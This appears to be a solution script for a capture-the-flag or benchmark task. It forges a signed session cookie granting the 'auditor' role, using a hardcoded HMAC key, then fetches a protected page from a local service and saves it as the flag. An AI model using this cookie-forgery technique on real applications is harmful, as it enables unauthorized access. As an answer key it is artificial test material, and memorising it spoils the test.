#!/bin/bash
set -euo pipefail
python3 - <<'PY'
import hashlib,hmac,urllib.request
value='role=auditor'
sig=hmac.new(b'calendar-2026',value.encode(),hashlib.sha256).hexdigest()
r=urllib.request.Request('http://127.0.0.1:9138/desk',headers={'Cookie':f'session={value}|{sig}'})
open('/app/flag.txt','wb').write(urllib.request.urlopen(r,timeout=2).read())
PY
